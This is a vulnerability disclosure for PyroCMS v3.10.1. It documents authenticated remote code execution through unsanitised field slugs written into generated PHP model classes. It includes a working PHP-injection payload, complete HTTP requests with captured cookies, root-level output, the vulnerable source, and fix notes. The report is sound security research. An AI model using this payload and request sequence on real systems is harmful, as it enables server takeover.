### Vulnerability details

**Official website / Product:** https://pyrocms.com / https://github.com/pyrocms/pyrocms

**Repository:** pyrocms/pyrocms (stars at selection: 3174)

**Vulnerability type:** RCE / getshell (PHP code injection via field-slug codegen)

**Vulnerability versions:** v3.10.1 (`39a4dd8542056df91bed457f523ed5b8c05bf89a`); `anomaly/streams-platform` `EntryFieldSlugsParser` as shipped with this release

**Vulnerability URL / Parameter:** `POST /admin/{module}/fields/create?field_type=anomaly.field_type.text` — form field `slug` (requires authenticated user who can manage fields; then assign field to a stream)

**Complex:** yes

### Verification procedure

1. Rebuild the lab (original `labs/pyrocms-r10a10` and custom image `pyrocms-r10a10:php84` may have been cleaned; use the reconstructable steps below). Start MariaDB first:

```yaml
# docker-compose.yml (DB only)
services:
  db:
    image: mariadb:10.11
    environment:
      MYSQL_DATABASE: pyrocms
      MYSQL_USER: pyro
      MYSQL_PASSWORD: pyropass
      MYSQL_ROOT_PASSWORD: rootpass
    ports:
      - "127.0.0.1:19011:3306"
```

Check out **pyrocms/pyrocms** tag **`v3.10.1`** (commit `39a4dd8542056df91bed457f523ed5b8c05bf89a`; ships `anomaly/streams-platform` including `EntryFieldSlugsParser`), run `composer install` under PHP **8.4**, point `.env` DB at `127.0.0.1:19011` (database/user/password `pyrocms` / `pyro` / `pyropass`), run `php artisan install` (or the installer wizard) to create admin **`admin@example.com` / `Admin123!@#`**, then `php -S 127.0.0.1:19010 -t public` (lab used PHP built-in server with `network_mode: host`). App URL: **http://127.0.0.1:19010**.
2. Log in as Control Panel admin: `admin@example.com` / **`Admin123!@#`**. Capture session cookies and `_token` (rotate per login; packets below are the lab-captured session — replace with your own Cookie/`_token` when reproducing).
3. `POST /admin/pages/fields/create?field_type=anomaly.field_type.text` with `slug` set to `x'];}system('id>/tmp/r10a10_rce');__halt_compiler();` (plus required `name` / `config__type=text`). Note the created field id (lab captured: `field_id=166`, pages default-type `stream_id=32`, payload as above; use the actual id on your instance).
4. Assign the field to the pages default-type stream: open the pages types assignments page in the Control Panel, read `stream_id` from the URL (lab used `32`), then `POST /admin/pages/types/assignments/{stream_id}/create?field={field_id}` — this triggers `compile()` / `GenerateEntryModel`.
5. Visit an admin route that autoloads the generated EntryModel: `GET /admin/pages/create` (HTTP 500 because leftover stub after `__halt_compiler()` is a parse error; `system()` already ran at include time).
6. On the host/process environment running the app, run `ls -l /tmp/r10a10_rce && cat /tmp/r10a10_rce` (or `docker exec <app> …` if containerized). Expected output:

```
-rw-r--r-- 1 root root 39 Nov  1 13:48 /tmp/r10a10_rce
uid=0(root) gid=0(root) groups=0(root)
```

### Complete vulnerability PoC

#### 1) Create malicious field (slug injection)

Complete HTTP request (Docker-verified):

```http
POST /admin/pages/fields/create?field_type=anomaly.field_type.text HTTP/1.1
Host: 127.0.0.1:19010
Content-Type: application/x-www-form-urlencoded
Content-Length: 222
Cookie: XSRF-TOKEN=eyJpdiI6InpHcVZNckRGZjBjM1BJM0I1aE1KQmc9PSIsInZhbHVlIjoiU1I2OWVCOGFkUVZkakI5L0c1U0Z4aEJYQkRwdTJMeTNScklxeWlWVVUvR0hhREFFUWd3djdibXhSWkhQYW5yNHZUNllJU2MxbHlhNXhqbHNnMHZITlpHUmZHVTBSYkpDWnFUWkEza2drTFliVXR4dVN1QlNwbnc2eHJZVlRGT0wiLCJtYWMiOiJjMDI0ZWYxNGIzZDU0ZTRjODg3OWE0M2I2Yzg1MDk1MDBkNGJmNTI5M2ZhZWNjOWNmZGIxODc2MmE2NzFiYWE2IiwidGFnIjoiIn0%3D; laravel_session=rLLRNk0RH0ACevwRfipvwFHwOlCgiba2VTQVUATO; http_cache_proxy=eyJpdiI6Ikh1TXo5UHV5RmRmZXdzSUIvS3BGa2c9PSIsInZhbHVlIjoiaUZVTzIySHRqaGpDK1NBQ1lYd3pOVjkzYnBPOXByT21yN0lCNHdvR1ZYZ1B3b3hxSHhTaGhzZzUxUHNFZm80YiIsIm1hYyI6IjE1YzAzMTA5MGZkZTNkNDIwOWEwOGZkZDljYmEyZTBhMmFmYjJhMTVjMTM4MmQwODNjYTdjOTc4MTZiYjZhZTIiLCJ0YWciOiIifQ%3D%3D; session_proxy=eyJpdiI6IjFxclRqNnBUd0RRVW4va1BtVFphL0E9PSIsInZhbHVlIjoiR0FSMGlOWXBBK0pQNkNRcC9kN0JYRnpvRGUrUEVNNHZDMFJEaExOYjFCbnUrcDcvZXdFcGpEbURnbGdiaXRidSIsIm1hYyI6ImYxMWVhNWMzYzM2ZjQ2Y2Y5NzdhYzU4NTY5NGM5ODY0ZmM4NjQ2MzgxN2UxZmQzN2Q2Nzk2NmM4MjFjZGExZDUiLCJ0YWciOiIifQ%3D%3D
Referer: http://127.0.0.1:19010/admin/pages/fields/create?field_type=anomaly.field_type.text

_token=dpnqGqOFa174uiqXYzuhY5ftCKmXKTC0XrYRrVhg&name=R10A10Exploit&name_en=R10A10Exploit&slug=x%27%5D%3B%7Dsystem%28%27id%3E%2Ftmp%2Fr10a10_rce%27%29%3B__halt_compiler%28%29%3B&config__type=text&config__max=255&action=save
```

(URL-decoded `slug` plaintext: `x'];}system('id>/tmp/r10a10_rce');__halt_compiler();`)

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 302 Found
Host: 127.0.0.1:19010
Connection: close
X-Powered-By: PHP/8.4.27
Cache-Control: public, s-maxage=0
Date: Sun, 01 Nov 2026 13:48:58 GMT
Location: http://127.0.0.1:19010/admin/pages/fields
Content-Type: text/html; charset=utf-8
X-Streams-Distribution: PyroCMS-v3.10
Set-Cookie: XSRF-TOKEN=eyJpdiI6Ii91bjhSVzRzbGtHQW9yeTQ1YVZsRkE9PSIsInZhbHVlIjoiWFU0TGtEY2VpM1NCZmVnUGRnTGtER2NSeFJ6anF4R29seng1eG5ndlkxMEsrNjBtSzladk9VNnRrK004c0pkMmZCZXhpRk8xbVFXcUxSN0ZmeXFvejN2K29QS0cyZ0RvR0MzZ1RqMmtJRXM4S0NZdGQvaG9ncHliT3FNSVdhOU8iLCJtYWMiOiI5ZDdkZTk1ZjAxOGVkMThjYTdlYzJlM2YwOTM4NGI5N2QxZjAwMjEzMGI4ODE0MDNiMGY5ZGQ3NzIwZDYwMjQ1IiwidGFnIjoiIn0%3D; expires=Sun, 01 Nov 2026 15:48:58 GMT; Max-Age=7200; path=/; samesite=lax, session_proxy=eyJpdiI6Imk0TXl6MjBxRHZpb1dpZWhTTGtISlE9PSIsInZhbHVlIjoiN1BHWHo0OEpiS1hxUFNJeGUvd25VM1ZWN1I2bm9OendIbFZSMVJXemR1cW91UlBaYmxueUNXWW9QN1VxRVJJTyIsIm1hYyI6ImU4ZjIxMTQ0NmZlMWRjYjE4YzgyNDNlYjg5ZTRhODdjMTk0OTYwOTcwNGIxNjc3MmY2MWVjZTViNTZjYjVkNzEiLCJ0YWciOiIifQ%3D%3D; expires=Sun, 01 Nov 2026 15:48:58 GMT; Max-Age=7200; path=/; httponly; samesite=lax, laravel_session=rLLRNk0RH0ACevwRfipvwFHwOlCgiba2VTQVUATO; expires=Sun, 01 Nov 2026 15:48:58 GMT; Max-Age=7200; path=/; httponly; samesite=lax

<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="refresh" content="0;url='http://127.0.0.1:19010/admin/pages/fields'" />

        <title>Redirecting to http://127.0.0.1:19010/admin/pages/fields</title>
    </head>
    <body>
        Redirecting to <a href="http://127.0.0.1:19010/admin/pages/fields">http://127.0.0.1:19010/admin/pages/fields</a>.
    </body>
</html>
```

#### 2) Assign field to stream (triggers GenerateEntryModel)

Same-session complete request (`field=166`, `stream_id=32`):

```http
POST /admin/pages/types/assignments/32/create?field=166 HTTP/1.1
Host: 127.0.0.1:19010
Content-Type: application/x-www-form-urlencoded
Content-Length: 102
Cookie: XSRF-TOKEN=eyJpdiI6IjU2M0RpSDB6b3U1OWVtbEQzOHRtTGc9PSIsInZhbHVlIjoieGJEcDJpbFZKNXBMWTBGSiswWkh3UDJtQUlTdUZHcFJkYWlNNWdmWkhMOTg5S0I5Y2hQY015UExUclJnYjlXZHcvcmpEVkJta2F4VXJVRXBEWGwrdFl4SWgyeVRRaW1zMnVGTDhCOGRuM1U4dEhmL2pkUng1YlllRUcvV3ZBOWIiLCJtYWMiOiJiNTEyN2FlNmRmNmQ2MDI2OGIyMWZhYmM5MzYyM2RmMmY5OTM4ODJjNjk0NzQzNGUwNTgxZDZkNjM2N2NlYTUyIiwidGFnIjoiIn0%3D; laravel_session=rLLRNk0RH0ACevwRfipvwFHwOlCgiba2VTQVUATO; http_cache_proxy=eyJpdiI6Ikh1TXo5UHV5RmRmZXdzSUIvS3BGa2c9PSIsInZhbHVlIjoiaUZVTzIySHRqaGpDK1NBQ1lYd3pOVjkzYnBPOXByT21yN0lCNHdvR1ZYZ1B3b3hxSHhTaGhzZzUxUHNFZm80YiIsIm1hYyI6IjE1YzAzMTA5MGZkZTNkNDIwOWEwOGZkZDljYmEyZTBhMmFmYjJhMTVjMTM4MmQwODNjYTdjOTc4MTZiYjZhZTIiLCJ0YWciOiIifQ%3D%3D; session_proxy=eyJpdiI6Ilg1QkVqY3pTSG51dmF4dDF2Z2U4NUE9PSIsInZhbHVlIjoib3VYOU8wN1BCQ080TFlPbHNkMmYvY3A3dmFzRWlRVmxrcmxRcytLNmpkeFJLbTJvUUk1bzFtYmdwRXhyQWowcyIsIm1hYyI6ImNlYWE0MzI1Mjg1OTE4NGVhYzZkMmNhYjFjMDJhNmI5YTc1MGE2Zjg4Y2JiYzJhMDVlM2Y0OGU4MGQyZTg1MTQiLCJ0YWciOiIifQ%3D%3D

_token=dpnqGqOFa174uiqXYzuhY5ftCKmXKTC0XrYRrVhg&label=R10A10Exploit&label_en=R10A10Exploit&action=save
```

Complete HTTP response:

```http
HTTP/1.1 302 Found
Host: 127.0.0.1:19010
Connection: close
X-Powered-By: PHP/8.4.27
Cache-Control: public, s-maxage=0
Date: Sun, 01 Nov 2026 13:48:58 GMT
Location: http://127.0.0.1:19010/admin/pages/types/assignments/32
Content-Type: text/html; charset=utf-8
X-Streams-Distribution: PyroCMS-v3.10
Set-Cookie: XSRF-TOKEN=eyJpdiI6IlB0dVh1S1hLUFcyS1RMMlJINTdWZ2c9PSIsInZhbHVlIjoiclkvb2dQbHQ2QkNGc0dlbndHUE1UVzYxSHBDN0IzYXBTZ0o5Q0RLbllJNkJLNFc4RExmT2U5bnBzKzBLR0FuSXY3K211U0R6aXJvMzhsN0JwQVVLK2l1cFJMRDR4eGFzQmMzMjN0V1JPL0EreUVMVjZDampBMVJwU3A2c0NvVFoiLCJtYWMiOiJmYjEwNTY1MjYzNzAzOTQyMDg0NjllYmMxMzEwZDRhMTA3NTdmZjQxOTRjY2E1ZDJjNGIzNjJhOTE1MWNiZmFhIiwidGFnIjoiIn0%3D; expires=Sun, 01 Nov 2026 15:48:58 GMT; Max-Age=7200; path=/; samesite=lax, session_proxy=eyJpdiI6ImJQN3lHbFUxV0FNbG01VFlzQzFWbVE9PSIsInZhbHVlIjoiajhCaXVVUjlUdDZUbVBHWnRpeHp6UGNYWlhxQWJXdUlhazhvQTlkOU1CRGI2RU1rdTN2eFRTOHhqTVAvWGpleSIsIm1hYyI6IjIwMzNmMzk4OGU0Y2UzNTc2YWJhYWRiMmVjZGU0MWExNzRjZDllODVhYzdkMDNmNzdjZWIwNzZhNTQ4Yjk1NjYiLCJ0YWciOiIifQ%3D%3D; expires=Sun, 01 Nov 2026 15:48:58 GMT; Max-Age=7200; path=/; httponly; samesite=lax, laravel_session=rLLRNk0RH0ACevwRfipvwFHwOlCgiba2VTQVUATO; expires=Sun, 01 Nov 2026 15:48:58 GMT; Max-Age=7200; path=/; httponly; samesite=lax

<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="refresh" content="0;url='http://127.0.0.1:19010/admin/pages/types/assignments/32'" />

        <title>Redirecting to http://127.0.0.1:19010/admin/pages/types/assignments/32</title>
    </head>
    <body>
        Redirecting to <a href="http://127.0.0.1:19010/admin/pages/types/assignments/32">http://127.0.0.1:19010/admin/pages/types/assignments/32</a>.
    </body>
</html>
```

Generated model after assign shows the unsanitized breakout in `$fields` (the `$rules` key is single-quote-escaped into a string key, but the `$fields` array literal is closed by the payload):

```php
# File: storage/streams/default/models/Pages/PagesDefaultPagesEntryModel.php
# (written by GenerateEntryModel; namespace Anomaly\Streams\Platform\Model\Pages)
protected $rules = [
    'content' => '',
    'x\'];}system(\'id>/tmp/r10a10_rce\');__halt_compiler();' => '',
];

protected $fields = [
    'content',
    'x'];}system('id>/tmp/r10a10_rce');__halt_compiler();',
];

# assignments snippet has field_id=166 / stream_id=32; field.slug is the same payload:
# 'slug' => 'x\'];}system(\'id>/tmp/r10a10_rce\');__halt_compiler();',
```

#### 3) Trigger model autoload (RCE)

```http
GET /admin/pages/create HTTP/1.1
Host: 127.0.0.1:19010
Cookie: XSRF-TOKEN=eyJpdiI6IlB0dVh1S1hLUFcyS1RMMlJINTdWZ2c9PSIsInZhbHVlIjoiclkvb2dQbHQ2QkNGc0dlbndHUE1UVzYxSHBDN0IzYXBTZ0o5Q0RLbllJNkJLNFc4RExmT2U5bnBzKzBLR0FuSXY3K211U0R6aXJvMzhsN0JwQVVLK2l1cFJMRDR4eGFzQmMzMjN0V1JPL0EreUVMVjZDampBMVJwU3A2c0NvVFoiLCJtYWMiOiJmYjEwNTY1MjYzNzAzOTQyMDg0NjllYmMxMzEwZDRhMTA3NTdmZjQxOTRjY2E1ZDJjNGIzNjJhOTE1MWNiZmFhIiwidGFnIjoiIn0%3D; laravel_session=rLLRNk0RH0ACevwRfipvwFHwOlCgiba2VTQVUATO; http_cache_proxy=eyJpdiI6Ikh1TXo5UHV5RmRmZXdzSUIvS3BGa2c9PSIsInZhbHVlIjoiaUZVTzIySHRqaGpDK1NBQ1lYd3pOVjkzYnBPOXByT21yN0lCNHdvR1ZYZ1B3b3hxSHhTaGhzZzUxUHNFZm80YiIsIm1hYyI6IjE1YzAzMTA5MGZkZTNkNDIwOWEwOGZkZDljYmEyZTBhMmFmYjJhMTVjMTM4MmQwODNjYTdjOTc4MTZiYjZhZTIiLCJ0YWciOiIifQ%3D%3D; session_proxy=eyJpdiI6ImJQN3lHbFUxV0FNbG01VFlzQzFWbVE9PSIsInZhbHVlIjoiajhCaXVVUjlUdDZUbVBHWnRpeHp6UGNYWlhxQWJXdUlhazhvQTlkOU1CRGI2RU1rdTN2eFRTOHhqTVAvWGpleSIsIm1hYyI6IjIwMzNmMzk4OGU0Y2UzNTc2YWJhYWRiMmVjZGU0MWExNzRjZDllODVhYzdkMDNmNzdjZWIwNzZhNTQ4Yjk1NjYiLCJ0YWciOiIifQ%3D%3D
```

Complete HTTP response headers (~49KB Streams Platform 500 HTML body with `<title>Streams Platform</title>`; error stack references parse failure in `PagesDefaultPagesEntryModel.php`. `system()` already ran at model include; leftover stub after `__halt_compiler()` caused the parse failure — success criterion is `/tmp/r10a10_rce` being written, not the 500 body itself):

```http
HTTP/1.1 500 Internal Server Error
Host: 127.0.0.1:19010
Connection: close
X-Powered-By: PHP/8.4.27
Cache-Control: no-cache, public, s-maxage=0
Date: Sun, 01 Nov 2026 13:48:58 GMT
Content-Type: text/html; charset=utf-8
X-Streams-Distribution: PyroCMS-v3.10
```

Impact (`ls -l /tmp/r10a10_rce && cat /tmp/r10a10_rce`):

```
-rw-r--r-- 1 root root 39 Nov  1 13:48 /tmp/r10a10_rce
uid=0(root) gid=0(root) groups=0(root)
```

Verification result notes:

Field id `166` was stored with the raw breakout slug (no `Str::slug` server-side). After assignment, `storage/streams/default/models/Pages/PagesDefaultPagesEntryModel.php` contained unsanitized PHP in `$fields`. Loading that model during `GET /admin/pages/create` executed `system('id>/tmp/r10a10_rce')` as root inside the container.

### Vulnerability analysis

PyroCMS Streams generates PHP EntryModel classes under `storage/streams/.../models/` whenever a stream/assignment/field is saved. `EntryFieldSlugsParser::parse` embeds each assignment field slug with `"\n        '{$slug}',"` and performs **no** escaping. Sibling parsers (`EntryRulesParser`, `EntryStreamParser`) correctly call `addcslashes(..., "'")`.

The admin Field form declares the slug input as `anomaly.field_type.slug` and attaches a weak `SlugValidator` (only rejects locale keys). Persistence goes through `EloquentFormRepository::prepareValueData` → `$entry->fill($data)->save()` on `FieldModel`. That path **does not** invoke `SlugFieldTypeModifier::modify()` (modifier runs on `EntryModel` field values, not on Field CRUD). Client-side `data-slugify` is bypassed by a direct HTTP POST.

A payload such as `x'];}system('id>/tmp/r10a10_rce');__halt_compiler();` closes the generated `$fields` array and class, runs arbitrary PHP at include time, then halts further parsing of the leftover stub. Assigning the field triggers `AssignmentObserver` / `FieldObserver::compileStreams` → `GenerateEntryModel`. Any subsequent request that autoloads the model achieves RCE/getshell.

Trigger / sink source (full path and line numbers):

```php
# File: vendor/anomaly/streams-platform/src/Entry/Parser/EntryFieldSlugsParser.php
# Lines: 21-31
public function parse(StreamInterface $stream)
{
    $string = "[";

    foreach ($stream->getAssignmentFieldSlugs() as $slug) {
        $string .= "\n        '{$slug}',";
    }

    $string .= "\n]";

    return $string;
}
```

```php
# File: vendor/anomaly/streams-platform/src/Model/EloquentFormRepository.php
# Lines: 142-145 (value taken from form without FieldTypeModifier::modify)
foreach ($allowed->notTranslatable() as $field) {
    if (!$field->getLocale()) {
        array_set($data, str_replace('__', '.', $field->getField()), $form->getValue($field->getInputName()));
    }
}
```

```php
# File: vendor/anomaly/streams-platform/src/Field/Form/Validator/SlugValidator.php
# Lines: 19-21
public function handle($value)
{
    return !in_array($value, array_keys(config('streams::locales.supported')));
}
```

### Fix notes

1. Escape field slugs in `EntryFieldSlugsParser` (and `EntryTranslatedAttributesParser`) with `addcslashes($slug, "'\\")` or `var_export`.
2. Apply `SlugFieldTypeModifier` (or equivalent `Str::slug` / regex allow-list) on Field/Stream slug persistence in `EloquentFormRepository` / FieldObserver.
3. Strengthen `SlugValidator` to require `^[a-z0-9_]+$` (or the configured separator set).
